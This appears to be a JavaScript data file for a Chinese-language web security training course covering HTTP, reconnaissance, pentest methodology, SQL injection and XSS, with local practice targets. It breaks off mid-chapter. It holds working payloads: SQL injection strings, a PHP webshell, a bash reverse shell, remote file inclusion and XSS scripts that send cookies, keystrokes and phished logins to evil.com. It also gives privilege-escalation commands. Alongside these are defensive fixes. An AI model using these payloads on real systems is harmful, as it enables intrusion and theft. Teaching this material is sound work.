const t=[{id:1,title:"Web 安全入门",description:"从零开始理解 Web 安全，掌握常见漏洞原理与实战技巧。",status:"published",chapters:[{id:1,course_id:1,title:"第一章：Web 安全基础",order:1,content:`# Web 安全基础

Web 安全关注 Web 应用的漏洞发现、利用与防御。

## 三大核心威胁

- **注入类**：SQL 注入、命令注入、LDAP 注入
- **跨站类**：XSS（存储/反射/DOM）、CSRF
- **认证类**：弱口令、会话劫持、权限绕过

## 学习路径

1. 理解 HTTP 请求/响应结构
2. 掌握浏览器开发者工具（F12）
3. 学会使用 Burp Suite / curl 构造请求
4. 在靶机环境复现漏洞

> 实战：启动本地靶机 \`python target1_nginx.py 8081\`，访问 \`http://localhost:8081\` 开始练习。
`},{id:2,course_id:1,title:"第二章：HTTP 协议与请求构造",order:2,content:`# HTTP 协议与请求构造

HTTP 是 Web 安全的核心协议，理解其结构是攻击的前提。

## 请求结构

\`\`\`
GET /admin HTTP/1.1
Host: localhost:8081
User-Agent: Mozilla/5.0
Cookie: session=abc123
\`\`\`

## 关键要素

- **方法**：GET（获取）、POST（提交）、PUT（更新）、DELETE（删除）
- **头部**：Host、Cookie、Authorization、Content-Type
- **正文**：POST 请求的参数数据

## 工具实战

\`\`\`bash
# curl 发送 GET 请求
curl http://localhost:8081/

# curl 发送 POST 请求
curl -X POST -d "username=admin&password=123" http://localhost:8081/login

# 查看响应头
curl -I http://localhost:8081/
\`\`\`
`},{id:3,course_id:1,title:"第三章：信息搜集技术",order:3,content:`# 信息搜集技术

渗透测试第一步：收集目标信息，发现攻击面。

## 被动搜集（不直接接触目标）

- **WHOIS**：查询域名注册信息
- **子域名枚举**：subdomain3、Amass
- **搜索引擎**：Google Hacking（\`site:target.com filetype:sql\`）
- **Shodan**：搜索联网设备（\`apache 2.4.49 country:CN\`）

## 主动搜集（直接接触目标）

- **端口扫描**：nmap -sV target.com
- **目录枚举**：dirsearch -u http://target.com
- **服务识别**：nmap -A target.com

## 靶机实战

启动靶机后，用 \`curl -I http://localhost:8081\` 查看响应头，用浏览器 \`Ctrl+U\` 查看源码，寻找隐藏信息。
`},{id:4,course_id:1,title:"第四章：常见漏洞类型",order:4,content:`# 常见漏洞类型

## 注入漏洞

- **SQL 注入**：\`' OR 1=1 --\` 绕过认证
- **命令注入**：\`; cat /etc/passwd\` 执行系统命令
- **代码注入**：\`<?php system($_GET['cmd']); ?>\`

## 跨站脚本（XSS）

- **反射型**：URL 参数注入，\`?search=<script>alert(1)<\/script>\`
- **存储型**：评论内容存入数据库，所有用户加载时执行
- **DOM 型**：前端 JS 直接操作 DOM，\`document.write(location.hash)\`

## 认证与授权

- **弱口令**：admin/123456、root/root
- **越权**：普通用户访问 \`/admin\` 路径
- **会话劫持**：窃取 Cookie 中的 session_id

## 文件操作

- **路径遍历**：\`../../etc/passwd\` 读取敏感文件
- **文件上传**：上传 \`.php\` 后门文件
- **文件包含**：\`?file=../../config.php\` 包含恶意文件
`},{id:5,course_id:1,title:"第五章：靶机实战入门",order:5,content:`# 靶机实战入门

## 环境准备

\`\`\`bash
# 下载项目
git clone https://github.com/fsywed/net_learn.git
cd net_learn/targets/local

# 启动 4 个靶机（纯 Python，无需 Docker）
python target1_nginx.py 8081 &
python target2_ssh.py 8082 &
python target3_sqli.py 8083 &
python target4_xss.py 8084 &
\`\`\`

## 靶机说明

| 靶机 | 端口 | 漏洞类型 | 难度 |
|---|---|---|---|
| target1 | 8081 | Nginx Flag 隐藏 | 简单 |
| target2 | 8082 | SSH 弱口令 | 简单 |
| target3 | 8083 | SQL 注入 | 中等 |
| target4 | 8084 | XSS 反射型 | 中等 |

## 实战流程

1. 访问 \`http://localhost:8081\`
2. 查看页面源码（\`Ctrl+U\`），寻找 Flag
3. 在网站首页提交 Flag 验证

> 提示：Flag 格式为 \`flag{...}\`，可能藏在 HTML 注释、响应头或隐藏文件中。
`}]},{id:2,title:"网络协议基础",description:"深入理解 TCP/IP、HTTP、DNS 等核心协议，掌握网络通信原理。",status:"published",chapters:[{id:6,course_id:2,title:"第一章：OSI 与 TCP/IP 模型",order:1,content:`# OSI 与 TCP/IP 模型

网络通信的分层模型，每层负责特定功能。

## OSI 七层模型

| 层级 | 功能 | 协议示例 |
|---|---|---|
| 应用层 | 用户接口 | HTTP、FTP、DNS、SMTP |
| 表示层 | 数据格式转换 | SSL/TLS、JPEG、ASCII |
| 会话层 | 会话管理 | NetBIOS、RPC |
| 传输层 | 端到端通信 | TCP、UDP |
| 网络层 | 路由选择 | IP、ICMP、ARP |
| 数据链路层 | 帧传输 | Ethernet、PPP |
| 物理层 | 比特流传输 | 光纤、双绞线 |

## TCP/IP 四层模型（实际使用）

- **应用层** = OSI 应用层 + 表示层 + 会话层
- **传输层** = TCP/UDP
- **网络层** = IP
- **网络接口层** = 数据链路层 + 物理层

## 数据封装过程

\`\`\`
应用数据 → TCP 头 + 数据 → IP 头 + TCP + 数据 → 帧头 + IP + TCP + 数据
\`\`\`
`},{id:7,course_id:2,title:"第二章：TCP 与 UDP 协议",order:2,content:`# TCP 与 UDP 协议

传输层两大协议，各有适用场景。

## TCP（传输控制协议）

**特点**：面向连接、可靠、有序、流量控制

**三次握手**：
1. 客户端 → SYN → 服务端
2. 服务端 → SYN+ACK → 客户端
3. 客户端 → ACK → 服务端

**四次挥手**：
1. 客户端 → FIN → 服务端（请求断开）
2. 服务端 → ACK → 客户端（确认）
3. 服务端 → FIN → 客户端（准备断开）
4. 客户端 → ACK → 服务端（确认）

**适用场景**：HTTP、FTP、SSH、邮件

## UDP（用户数据报协议）

**特点**：无连接、不可靠、快速、支持广播

**适用场景**：DNS、视频流、游戏、VoIP

## 实战命令

\`\`\`bash
# 查看 TCP 连接
netstat -antp

# 查看监听端口
ss -tlnp

# 测试 TCP 连接
nc -zv localhost 80
\`\`\`
`},{id:8,course_id:2,title:"第三章：HTTP/HTTPS 协议",order:3,content:`# HTTP/HTTPS 协议

Web 安全的核心协议。

## HTTP 请求方法

| 方法 | 用途 | 幂等性 |
|---|---|---|
| GET | 获取资源 | 是 |
| POST | 提交数据 | 否 |
| PUT | 更新资源 | 是 |
| DELETE | 删除资源 | 是 |
| HEAD | 获取响应头 | 是 |
| OPTIONS | 查询支持的方法 | 是 |

## HTTP 状态码

- **2xx 成功**：200 OK、201 Created、204 No Content
- **3xx 重定向**：301 永久、302 临时、304 未修改
- **4xx 客户端错误**：400 请求错误、401 未认证、403 禁止、404 未找到
- **5xx 服务器错误**：500 内部错误、502 网关错误、503 服务不可用

## HTTPS（HTTP + TLS）

**加密过程**：
1. 客户端发起 TLS 握手
2. 服务端返回证书（含公钥）
3. 客户端验证证书，生成对称密钥
4. 用公钥加密对称密钥，发送给服务端
5. 双方用对称密钥加密通信

**安全要点**：
- 证书由 CA 签发
- 防止中间人攻击
- 端口 443（HTTP 是 80）
`},{id:9,course_id:2,title:"第四章：DNS 协议与攻击",order:4,content:`# DNS 协议与攻击

域名系统（Domain Name System），将域名解析为 IP 地址。

## DNS 查询过程

1. 浏览器缓存 → 2. 系统缓存 → 3. 本地 DNS 服务器 → 4. 根域名服务器 → 5. 顶级域名服务器 → 6. 权威域名服务器

## DNS 记录类型

| 类型 | 用途 | 示例 |
|---|---|---|
| A | IPv4 地址 | example.com → 93.184.216.34 |
| AAAA | IPv6 地址 | example.com → 2606:2800:220:1:... |
| CNAME | 别名 | www.example.com → example.com |
| MX | 邮件服务器 | example.com → mail.example.com |
| TXT | 文本信息（SPF、DKIM） | \`v=spf1 include:_spf.google.com ~all\` |
| NS | 权威域名服务器 | example.com → ns1.example.com |

## DNS 攻击

**DNS 劫持**：
- 修改 DNS 服务器指向
- 返回虚假 IP 地址
- 用户访问钓鱼网站

**DNS 缓存投毒**：
- 向 DNS 服务器注入虚假记录
- 污染缓存，影响所有用户

**DNS 隧道**：
- 利用 DNS 查询传输数据
- 绕过防火墙检测
- 工具：dnscat2、iodine

## 实战命令

\`\`\`bash
# 查询域名 IP
dig example.com
nslookup example.com

# 查询特定记录
dig example.com MX
dig example.com TXT

# 指定 DNS 服务器
dig @8.8.8.8 example.com
\`\`\`
`}]},{id:3,title:"渗透测试方法论",description:"系统化掌握渗透测试流程：信息搜集、漏洞利用、权限提升、报告撰写。",status:"published",chapters:[{id:10,course_id:3,title:"第一章：渗透测试五阶段",order:1,content:`# 渗透测试五阶段

## 1. 情报搜集（Reconnaissance）

**被动搜集**（不接触目标）：
- WHOIS 查询域名信息
- 搜索引擎：\`site:target.com filetype:pdf\`
- Shodan：\`apache 2.4.49 country:CN\`
- 社交媒体：LinkedIn、GitHub

**主动搜集**（接触目标）：
- 子域名枚举：subdomain3、Amass
- 端口扫描：nmap -sV target.com
- 技术栈识别：Wappalyzer、BuiltWith

## 2. 扫描探测（Scanning）

- **端口扫描**：nmap -p- target.com（全端口）
- **服务识别**：nmap -sV（版本检测）
- **漏洞扫描**：Nessus、OpenVAS、Nikto
- **目录枚举**：dirsearch、gobuster

## 3. 漏洞利用（Exploitation）

- 根据扫描结果选择漏洞
- 使用 Metasploit、searchsploit 查找利用代码
- 手动构造 Payload（SQL 注入、XSS）
- 获取初始访问权限（shell、webshell）

## 4. 权限提升（Privilege Escalation）

**垂直提权**（普通用户 → 管理员）：
- Linux：SUID、sudo 配置错误、内核漏洞
- Windows：服务配置错误、注册表权限

**水平提权**（同级别用户 A → 用户 B）：
- 共享文件权限
- 会话劫持

## 5. 报告撰写（Reporting）

**报告结构**：
1. 执行摘要（给管理层）
2. 技术细节（给开发人员）
3. 漏洞列表（严重性、CVSS 评分）
4. 复现步骤（截图、命令）
5. 修复建议（优先级排序）
`},{id:11,course_id:3,title:"第二章：信息搜集技术",order:2,content:`# 信息搜集技术

## 被动信息搜集

**WHOIS 查询**：
\`\`\`bash
whois example.com
# 获取注册人、注册商、DNS 服务器
\`\`\`

**搜索引擎 Hacking**：
\`\`\`
site:example.com           # 仅搜索该域名
filetype:pdf               # 搜索 PDF 文件
inurl:admin                # URL 包含 admin
intitle:"index of"         # 目录列表
"password" filetype:sql    # 泄露的数据库文件
\`\`\`

**Shodan 搜索**：
\`\`\`
apache 2.4.49              # 特定版本
port:22 country:CN         # 中国 SSH 服务
openssl 1.0.1              # 存在 Heartbleed 的主机
\`\`\`

## 主动信息搜集

**子域名枚举**：
\`\`\`bash
# subdomain3
python3 subdomain3.py -d example.com

# Amass
amass enum -d example.com
\`\`\`

**端口扫描**：
\`\`\`bash
# 快速扫描常用端口
nmap target.com

# 全端口扫描
nmap -p- target.com

# 服务版本检测
nmap -sV target.com

# 操作系统检测
nmap -O target.com

# 综合扫描（推荐）
nmap -A target.com
\`\`\`

**目录枚举**：
\`\`\`bash
# dirsearch
dirsearch -u http://target.com -e php,html,js

# gobuster
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
\`\`\`

## 技术栈识别

- **Wappalyzer**：浏览器插件，识别 CMS、框架、服务器
- **BuiltWith**：在线工具，分析网站技术栈
- **查看响应头**：\`curl -I http://target.com\`
`},{id:12,course_id:3,title:"第三章：漏洞扫描与利用",order:3,content:`# 漏洞扫描与利用

## 漏洞扫描工具

**Nikto（Web 漏洞扫描）**：
\`\`\`bash
nikto -h http://target.com
# 检测：危险文件、过时软件、服务器配置问题
\`\`\`

**Nessus（综合漏洞扫描）**：
- 图形界面，支持插件
- 检测：系统漏洞、配置错误、默认口令

**OpenVAS（开源替代）**：
- 功能类似 Nessus
- 完全免费开源

## 漏洞利用框架

**Metasploit**：
\`\`\`bash
# 启动 msfconsole
msfconsole

# 搜索漏洞利用
search apache 2.4.49

# 选择利用模块
use exploit/unix/http/apache_normalize_path_rce

# 设置参数
set RHOSTS target.com
set LHOST your_ip

# 执行
exploit
\`\`\`

**searchsploit（本地漏洞库）**：
\`\`\`bash
# 搜索漏洞
searchsploit apache 2.4.49

# 查看利用代码
searchsploit -x 50570
\`\`\`

## 手动漏洞利用

**SQL 注入**：
\`\`\`bash
# 测试注入点
curl "http://target.com/login?username=admin'--&password=123"

# 联合查询获取数据
curl "http://target.com/page?id=1 UNION SELECT 1,2,3--"
\`\`\`

**命令注入**：
\`\`\`bash
# 测试注入
curl "http://target.com/ping?ip=127.0.0.1;cat /etc/passwd"
\`\`\`

**文件包含**：
\`\`\`bash
# 本地文件包含
curl "http://target.com/page?file=../../../etc/passwd"

# 远程文件包含
curl "http://target.com/page?file=http://evil.com/shell.php"
\`\`\`

## 获取 Shell

**反弹 Shell**：
\`\`\`bash
# 目标机执行（bash）
bash -i >& /dev/tcp/your_ip/4444 0>&1

# 你的机器监听
nc -lvnp 4444
\`\`\`

**Webshell**：
\`\`\`php
<?php system($_GET['cmd']); ?>
# 访问：http://target.com/shell.php?cmd=whoami
\`\`\`
`},{id:13,course_id:3,title:"第四章：权限提升",order:4,content:`# 权限提升

获取初始访问后，通常需要提权到更高权限。

## Linux 提权

**信息收集**：
\`\`\`bash
# 系统信息
uname -a
cat /etc/os-release

# 当前用户
id
whoami

# SUID 文件（可能提权）
find / -perm -4000 2>/dev/null

# sudo 权限
sudo -l

# 可写目录
find / -writable -type d 2>/dev/null
\`\`\`

**SUID 提权**：
\`\`\`bash
# 查找 SUID 文件
find / -perm -4000 -type f 2>/dev/null

# 检查 GTFOBins（https://gtfobins.github.io/）
# 例如：find 命令 SUID
find . -exec /bin/sh -p \\; -quit
\`\`\`

**sudo 配置错误**：
\`\`\`bash
# 查看 sudo 权限
sudo -l

# 如果允许执行特定命令
sudo /bin/bash
sudo vim -c ':!/bin/bash'
\`\`\`

**内核漏洞提权**：
\`\`\`bash
# 查看内核版本
uname -r

# 搜索漏洞利用
searchsploit linux kernel 4.15
\`\`\`

## Windows 提权

**信息收集**：
\`\`\`cmd
:: 系统信息
systeminfo
ver

:: 当前用户
whoami
net user %username%

:: 服务列表
sc query
net start

:: 补丁列表
wmic qfe get
\`\`\`

**服务配置错误**：
\`\`\`cmd
:: 查找可写服务
accesschk.exe /accepteula -uwdq C:\\

:: 替换服务二进制文件
sc stop vuln_service
copy malicious.exe C:\\path\\to\\service.exe
sc start vuln_service
\`\`\`

**注册表权限**：
\`\`\`cmd
:: 检查自动启动项
reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run

:: 如果可写，替换为恶意程序
\`\`\`

## 自动化提权工具

**Linux**：
- LinEnum：https://github.com/rebootuser/LinEnum
- linux-exploit-suggester：https://github.com/mzet-/linux-exploit-suggester
- PEASS：https://github.com/carlospolop/PEASS-ng

**Windows**：
- WinPEAS：https://github.com/carlospolop/PEASS-ng
- PowerUp：https://github.com/PowerShellMafia/PowerSploit
- SharpUp：https://github.com/GhostPack/SharpUp
`},{id:14,course_id:3,title:"第五章：报告撰写",order:5,content:`# 渗透测试报告撰写

报告是渗透测试的最终交付物，质量直接影响客户对工作的评价。

## 报告结构

### 1. 执行摘要（给管理层）

**内容**：
- 测试范围与目标
- 发现的高危漏洞数量
- 业务影响评估
- 整体风险等级（高/中/低）
- 修复优先级建议

**示例**：
> 本次测试发现 3 个高危漏洞、5 个中危漏洞、2 个低危漏洞。攻击者可利用 SQL 注入获取数据库访问权限，导致敏感数据泄露。建议立即修复高危漏洞，并在 30 天内完成中危漏洞修复。

### 2. 技术细节（给开发人员）

**每个漏洞包含**：
- **漏洞名称**：SQL 注入 - 登录页面
- **严重性**：高危（CVSS 9.8）
- **漏洞位置**：\`http://target.com/login\`，参数 \`username\`
- **复现步骤**：
  1. 访问登录页面
  2. 输入用户名 \`admin' OR '1'='1\`，密码任意
  3. 成功登录管理员账户
- **截图/视频**：证明漏洞存在
- **影响**：攻击者可绕过认证，获取管理员权限

### 3. 漏洞列表

| 编号 | 漏洞名称 | 严重性 | CVSS | 状态 |
|---|---|---|---|---|
| 1 | SQL 注入 - 登录页面 | 高危 | 9.8 | 待修复 |
| 2 | XSS 反射型 - 搜索框 | 中危 | 6.1 | 待修复 |
| 3 | 目录遍历 - 文件下载 | 高危 | 7.5 | 待修复 |

### 4. 修复建议

**SQL 注入修复**：
\`\`\`python
# 错误示例（存在注入）
query = f"SELECT * FROM users WHERE username='{username}'"

# 正确示例（参数化查询）
cursor.execute("SELECT * FROM users WHERE username=?", (username,))
\`\`\`

**XSS 修复**：
\`\`\`javascript
// 错误示例（直接输出）
document.getElementById("output").innerHTML = userInput;

// 正确示例（转义输出）
document.getElementById("output").textContent = userInput;
\`\`\`

### 5. 附录

- 测试工具清单
- 测试时间线
- 参考标准（OWASP Top 10、CWE）

## 报告撰写原则

1. **客观准确**：只陈述事实，不夸大风险
2. **可复现**：步骤清晰，开发人员能复现
3. **优先级明确**：按 CVSS 评分排序
4. **修复可行**：建议具体，提供代码示例
5. **语言简洁**：避免技术术语堆砌
`}]},{id:4,title:"SQL 注入实战",description:"深入理解 SQL 注入原理，掌握联合查询、盲注、绕过技巧。",status:"published",chapters:[{id:15,course_id:4,title:"第一章：SQL 注入原理",order:1,content:`# SQL 注入原理

SQL 注入是最危险的 Web 漏洞之一，攻击者通过构造恶意输入干扰后端 SQL 语句。

## 注入成因

**后端代码**（Python + SQLite 示例）：
\`\`\`python
# 危险：直接拼接用户输入
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
cursor.execute(query)
\`\`\`

**攻击输入**：
\`\`\`
username = admin' --
password = anything
\`\`\`

**生成的 SQL**：
\`\`\`sql
SELECT * FROM users WHERE username='admin' --' AND password='anything'
\`\`\`

\`--\` 注释掉密码验证，成功登录。

## 注入类型

**按输入类型**：
- **数字型**：\`id=1 OR 1=1\`
- **字符型**：\`username=admin' OR '1'='1\`

**按注入位置**：
- **URL 参数**：\`?id=1 UNION SELECT 1,2,3\`
- **表单输入**：登录框、搜索框
- **HTTP 头部**：User-Agent、Cookie、X-Forwarded-For

**按数据回显**：
- **联合查询注入**：页面直接显示查询结果
- **盲注**：页面无回显，需通过布尔/时间判断
- **报错注入**：利用数据库报错信息

## 靶机实战

启动 SQL 注入靶机：
\`\`\`bash
python target3_sqli.py 8083
\`\`\`

访问 \`http://localhost:8083\`，尝试登录：
- 用户名：\`admin' --\`
- 密码：任意

> 原理：\`--\` 注释掉后续 SQL，绕过密码验证。
`},{id:16,course_id:4,title:"第二章：联合查询注入",order:2,content:`# 联合查询注入

当页面直接显示查询结果时，使用 \`UNION SELECT\` 提取数据。

## 注入步骤

### 1. 确定列数

**方法 1：ORDER BY 猜解**
\`\`\`
?id=1 ORDER BY 1--    # 正常
?id=1 ORDER BY 2--    # 正常
?id=1 ORDER BY 3--    # 报错 → 列数为 2
\`\`\`

**方法 2：UNION SELECT 猜解**
\`\`\`
?id=1 UNION SELECT 1--          # 报错（列数不匹配）
?id=1 UNION SELECT 1,2--        # 正常（列数为 2）
?id=1 UNION SELECT 1,2,3--      # 报错
\`\`\`

### 2. 确定回显位置

\`\`\`
?id=0 UNION SELECT 1,2--
# 页面显示 1 和 2，记录位置
\`\`\`

### 3. 获取数据库信息

**SQLite**：
\`\`\`sql
# 获取表名
?id=0 UNION SELECT 1,group_concat(name) FROM sqlite_master WHERE type='table'--
# 结果：users,products,orders

# 获取列名（假设表名为 users）
?id=0 UNION SELECT 1,group_concat(sql) FROM sqlite_master WHERE type='table' AND name='users'--
# 结果：CREATE TABLE users(id INTEGER, username TEXT, password TEXT)
\`\`\`

**MySQL**：
\`\`\`sql
# 获取当前数据库
?id=0 UNION SELECT 1,database()--

# 获取所有表
?id=0 UNION SELECT 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()--

# 获取列名
?id=0 UNION SELECT 1,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--
\`\`\`

### 4. 提取数据

\`\`\`sql
# 获取用户名和密码
?id=0 UNION SELECT 1,group_concat(username,':',password) FROM users--
# 结果：admin:admin123,user1:password1
\`\`\`

## 靶机实战

启动靶机：
\`\`\`bash
python target3_sqli.py 8083
\`\`\`

访问 \`http://localhost:8083\`，在搜索框尝试：
1. 输入 \`1\` → 显示 ID 为 1 的内容
2. 输入 \`0 UNION SELECT 1,2\` → 确定列数
3. 输入 \`0 UNION SELECT 1,group_concat(name) FROM sqlite_master WHERE type='table'\` → 获取表名
4. 提取 Flag

> 提示：Flag 可能藏在某个表的字段中。
`},{id:17,course_id:4,title:"第三章：盲注技术",order:3,content:`# 盲注技术

当页面无回显或回显固定时，通过布尔判断或时间延迟提取数据。

## 布尔盲注

页面只有两种状态：正常（True）/ 异常（False）。

**逐字符猜解**：
\`\`\`sql
# 猜解数据库名第一个字符
?id=1 AND substring(database(),1,1)='a'--    # False
?id=1 AND substring(database(),1,1)='b'--    # False
?id=1 AND substring(database(),1,1)='s'--    # True → 第一个字符是 's'

# 猜解第二个字符
?id=1 AND substring(database(),2,1)='q'--    # True → 第二个字符是 'q'
\`\`\`

**二分法优化**：
\`\`\`sql
# 判断第一个字符 ASCII 是否大于 100
?id=1 AND ascii(substring(database(),1,1))>100--    # True
?id=1 AND ascii(substring(database(),1,1))>150--    # False
?id=1 AND ascii(substring(database(),1,1))>125--    # True
# 逐步缩小范围，最终确定字符
\`\`\`

## 时间盲注

页面无任何变化，通过响应时间判断。

**SQLite**：
\`\`\`sql
# 如果条件为真，延迟 5 秒
?id=1 AND 1=CASE WHEN substring(database(),1,1)='s' THEN randomblob(100000000) ELSE 1 END--
\`\`\`

**MySQL**：
\`\`\`sql
# 如果条件为真，sleep 5 秒
?id=1 AND IF(substring(database(),1,1)='s',sleep(5),1)--
\`\`\`

**PostgreSQL**：
\`\`\`sql
# 如果条件为真，pg_sleep 5 秒
?id=1 AND CASE WHEN substring(database(),1,1)='s' THEN pg_sleep(5) ELSE 1 END--
\`\`\`

## 自动化盲注工具

**sqlmap**：
\`\`\`bash
# 自动检测注入点
sqlmap -u "http://target.com/page?id=1"

# 提取数据库名
sqlmap -u "http://target.com/page?id=1" --dbs

# 提取表名
sqlmap -u "http://target.com/page?id=1" -D target_db --tables

# 提取数据
sqlmap -u "http://target.com/page?id=1" -D target_db -T users --dump
\`\`\`

## 靶机实战

启动靶机：
\`\`\`bash
python target3_sqli.py 8083
\`\`\`

如果联合查询被过滤，尝试盲注：
1. 输入 \`1 AND 1=1\` → 页面正常
2. 输入 \`1 AND 1=2\` → 页面无内容
3. 使用布尔盲注逐字符猜解 Flag

> 提示：编写 Python 脚本自动化猜解，手动太慢。
`},{id:18,course_id:4,title:"第四章：防御与修复",order:4,content:`# SQL 注入防御与修复

## 防御方案

### 1. 参数化查询（最佳实践）

**Python + SQLite**：
\`\`\`python
# 错误：字符串拼接
cursor.execute(f"SELECT * FROM users WHERE username='{username}'")

# 正确：参数化查询
cursor.execute("SELECT * FROM users WHERE username=?", (username,))
\`\`\`

**Python + MySQL**：
\`\`\`python
cursor.execute("SELECT * FROM users WHERE username=%s", (username,))
\`\`\`

**Java + JDBC**：
\`\`\`java
PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE username=?");
stmt.setString(1, username);
ResultSet rs = stmt.executeQuery();
\`\`\`

**Node.js + MySQL**：
\`\`\`javascript
connection.execute('SELECT * FROM users WHERE username=?', [username]);
\`\`\`

### 2. ORM 框架

使用 SQLAlchemy、Django ORM、Hibernate 等 ORM，自动处理参数化。

\`\`\`python
# SQLAlchemy
user = session.query(User).filter(User.username == username).first()
\`\`\`

### 3. 输入验证

**白名单验证**：
\`\`\`python
# 只允许字母数字
if not re.match(r'^[a-zA-Z0-9]+$', username):
    raise ValueError("Invalid username")
\`\`\`

**类型转换**：
\`\`\`python
# 强制转换为整数
user_id = int(request.args.get('id'))
\`\`\`

### 4. 最小权限原则

\`\`\`sql
-- 创建专用数据库用户，仅授予必要权限
CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'strong_password';
GRANT SELECT, INSERT, UPDATE ON target_db.* TO 'webapp'@'localhost';
-- 不授予 DROP、DELETE、CREATE 等高危权限
\`\`\`

### 5. WAF（Web 应用防火墙）

**ModSecurity 规则示例**：
\`\`\`
SecRule ARGS "@rx (?i)(union.*select|select.*from)" "id:1001,deny,msg:'SQL Injection'"
\`\`\`

**云 WAF**：
- Cloudflare WAF
- 阿里云 WAF
- 腾讯云 WAF

### 6. 错误处理

\`\`\`python
try:
    cursor.execute(query, params)
except Exception as e:
    # 不向用户暴露详细错误
    logger.error(f"Database error: {e}")
    return "Internal server error", 500
\`\`\`

## 安全开发流程

1. **代码审查**：检查所有 SQL 语句是否参数化
2. **静态分析**：使用 SonarQube、Bandit 扫描代码
3. **动态测试**：定期使用 sqlmap 测试
4. **安全培训**：开发人员了解注入原理

## 靶机实战

修复靶机中的 SQL 注入漏洞：

**修复前**（target3_sqli.py）：
\`\`\`python
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
\`\`\`

**修复后**：
\`\`\`python
cursor.execute("SELECT * FROM users WHERE username=? AND password=?", (username, password))
\`\`\`

> 验证：使用 \`admin' --\` 登录，修复后应失败。
`}]},{id:5,title:"XSS 跨站脚本",description:"理解 XSS 攻击原理，掌握反射型、存储型、DOM 型 XSS 的利用与防御。",status:"published",chapters:[{id:19,course_id:5,title:"第一章：XSS 原理与类型",order:1,content:`# XSS 原理与类型

XSS（Cross-Site Scripting，跨站脚本）攻击通过在页面注入恶意脚本，在其他用户浏览器执行。

## 攻击原理

1. 攻击者构造恶意脚本（JavaScript）
2. 脚本注入到目标页面
3. 其他用户访问该页面
4. 浏览器执行恶意脚本
5. 窃取 Cookie、会话、敏感信息

## XSS 类型

### 1. 反射型 XSS

**特点**：脚本在 URL 参数中，服务器反射回页面

**示例**：
\`\`\`
http://target.com/search?q=<script>alert(document.cookie)<\/script>
\`\`\`

**后端代码**（危险）：
\`\`\`python
# 直接将用户输入嵌入页面
return f"<html><body>搜索结果：{query}</body></html>"
\`\`\`

**攻击场景**：
- 诱导用户点击恶意链接
- 窃取 Cookie、会话
- 钓鱼攻击

### 2. 存储型 XSS

**特点**：脚本存入数据库，所有用户加载时执行

**示例**：
- 评论区：\`<script>fetch('http://evil.com/steal?cookie='+document.cookie)<\/script>\`
- 个人简介：\`<img src=x onerror="alert(1)">\`

**后端代码**（危险）：
\`\`\`python
# 将用户输入直接存入数据库，未转义
db.execute(f"INSERT INTO comments (content) VALUES ('{content}')")

# 页面加载时直接输出
for comment in comments:
    print(f"<div>{comment['content']}</div>")
\`\`\`

**攻击场景**：
- 影响所有访问该页面的用户
- 传播蠕虫
- 大规模窃取信息

### 3. DOM 型 XSS

**特点**：前端 JavaScript 直接操作 DOM，不经过服务器

**示例**：
\`\`\`javascript
// 危险：直接使用 location.hash
document.getElementById("output").innerHTML = location.hash.substring(1);

// 访问：http://target.com/page#<img src=x onerror=alert(1)>
\`\`\`

**常见危险 API**：
- \`document.write()\`
- \`element.innerHTML\`
- \`eval()\`
- \`setTimeout(string)\`

## 靶机实战

启动 XSS 靶机：
\`\`\`bash
python target4_xss.py 8084
\`\`\`

访问 \`http://localhost:8084\`，在搜索框输入：
\`\`\`
<script>alert(document.cookie)<\/script>
\`\`\`

> 如果弹出 Cookie，说明存在反射型 XSS。
`},{id:20,course_id:5,title:"第二章：XSS 利用技巧",order:2,content:`# XSS 利用技巧

## 绕过过滤

### 1. 标签绕过

\`\`\`html
<!-- 基本 -->
<script>alert(1)<\/script>

<!-- img 标签 -->
<img src=x onerror=alert(1)>

<!-- svg 标签 -->
<svg onload=alert(1)>

<!-- body 标签 -->
<body onload=alert(1)>

<!-- input 标签 -->
<input onfocus=alert(1) autofocus>

<!-- details 标签 -->
<details open ontoggle=alert(1)>
\`\`\`

### 2. 事件处理器

\`\`\`html
<!-- 鼠标事件 -->
<div onmouseover=alert(1)>hover me</div>
<a onmouseover=alert(1)>click me</a>

<!-- 焦点事件 -->
<input onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>

<!-- 加载事件 -->
<img src=x onerror=alert(1)>
<video src=x onerror=alert(1)>
<body onload=alert(1)>
\`\`\`

### 3. 编码绕过

\`\`\`html
<!-- HTML 实体编码 -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>

<!-- Unicode 编码 -->
<img src=x onerror=\\u0061\\u006c\\u0065\\u0072\\u0074(1)>

<!-- Base64 编码 -->
<img src=x onerror="eval(atob('YWxlcnQoMSk='))">

<!-- 混合编码 -->
<img src=x onerror="\\u0061lert(1)">
\`\`\`

### 4. 大小写混合

\`\`\`html
<ScRiPt>alert(1)<\/ScRiPt>
<ImG sRc=x OnErRoR=alert(1)>
\`\`\`

### 5. 双写绕过

\`\`\`html
<!-- 如果过滤 <script> -->
<scr<script>ipt>alert(1)</scr<\/script>ipt>
\`\`\`

## 窃取 Cookie

### 1. 直接发送到攻击者服务器

\`\`\`javascript
<script>
fetch('http://evil.com/steal?cookie=' + encodeURIComponent(document.cookie));
<\/script>
\`\`\`

### 2. 使用 Image 对象

\`\`\`javascript
<script>
new Image().src = 'http://evil.com/steal?cookie=' + encodeURIComponent(document.cookie);
<\/script>
\`\`\`

### 3. 创建表单自动提交

\`\`\`javascript
<script>
var form = document.createElement('form');
form.action = 'http://evil.com/steal';
form.method = 'POST';

var input = document.createElement('input');
input.name = 'cookie';
input.value = document.cookie;
form.appendChild(input);

form.submit();
<\/script>
\`\`\`

## 钓鱼攻击

\`\`\`javascript
<script>
// 伪造登录框
document.body.innerHTML = \`
  <h1>会话已过期，请重新登录</h1>
  <form action="http://evil.com/phish" method="POST">
    <input type="text" name="username" placeholder="用户名">
    <input type="password" name="password" placeholder="密码">
    <button type="submit">登录</button>
  </form>
\`;
<\/script>
\`\`\`

## 键盘记录

\`\`\`javascript
<script>
document.addEventListener('keypress', function(e) {
  fetch('http://evil.com/keylog?key=' + encodeURIComponent(e.key));
});
<\/script>
\`\`\`

## 靶机实战

启动靶机：
\`\`\`bash
